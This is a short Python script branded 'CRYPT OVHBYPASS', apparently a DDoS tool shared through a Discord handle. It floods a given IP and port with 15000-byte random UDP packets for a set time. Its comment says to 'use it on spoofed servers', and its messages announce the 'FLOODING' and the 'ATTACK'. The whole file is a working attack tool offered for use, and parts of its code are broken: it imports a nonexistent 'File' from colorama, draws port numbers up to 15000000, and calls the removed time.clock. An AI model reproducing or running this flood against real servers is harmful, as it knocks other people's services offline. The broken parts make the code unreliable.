#!/usr/bin/python
#discord ཊᛗ𐌽ཏ CRYPT#0001
#use it on spoofed servers

import socket,random,sys,time
from colorama import Fore, File



if len(sys.argv)==1:

    sys.exit('[CRYPT OVHPYPASS]: [IP] [PORT] [TIME]')

print(Fore.GREEN + '''


╔═╗╦═╗╦ ╦╔═╗╦ ╦╔═╗╔╦╗
║  ╠╦╝║ ║╚═╗╠═╣║╣  ║║
╚═╝╩╚═╚═╝╚═╝╩ ╩╚═╝═╩╝


''')



def udp_protocol():

    port = int(sys.argv[2])

    randport=(True,False)[port==0]

    ip = sys.argv[1]

    dur = int(sys.argv[3])

    clock=(lambda:0,time.clock)[dur>0]

    duration=(1,(clock()+dur))[dur>0]
	
    
    print('[OVHBYPASS] FLOODING %s ON PORT %s !'%(ip, port or 'infinite'))
	
	
    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

    bytes=random._urandom(15000)

    while True:

        port=(random.randint(1,15000000),port)[randport]

        if clock()<duration:

            sock.sendto(bytes,(ip,port))

        else:

            break

    print('[OVHBYPASS] ATTACK HAS BEEN STOPPED !')

udp_protocol()
